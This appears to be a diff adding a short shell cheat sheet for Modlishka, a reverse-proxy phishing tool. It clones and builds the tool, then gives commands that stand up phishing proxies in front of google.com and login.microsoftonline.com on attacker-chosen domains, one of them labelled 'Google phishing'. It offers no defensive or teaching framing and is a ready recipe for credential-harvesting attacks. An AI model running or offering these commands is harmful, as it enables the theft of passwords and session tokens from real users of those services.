@@ -1,0 +1,14 @@
+# ================= Modlishka =================
+# Clone and build
+git clone https://github.com/drk1wi/Modlishka.git
+cd Modlishka
+go build -o modlishka main.go
+
+# Run Modlishka with config
+./modlishka -config config.json
+
+# Example: Google phishing
+./modlishka -phishlets ./phishlets/google.json -proxyDomain phish.mydomain.com -listeningPort 443 -target google.com
+
+# Use auto-generated certificates (Not recommended for production)
+./modlishka -autocert -proxyDomain login.phishme.com -target login.microsoftonline.com
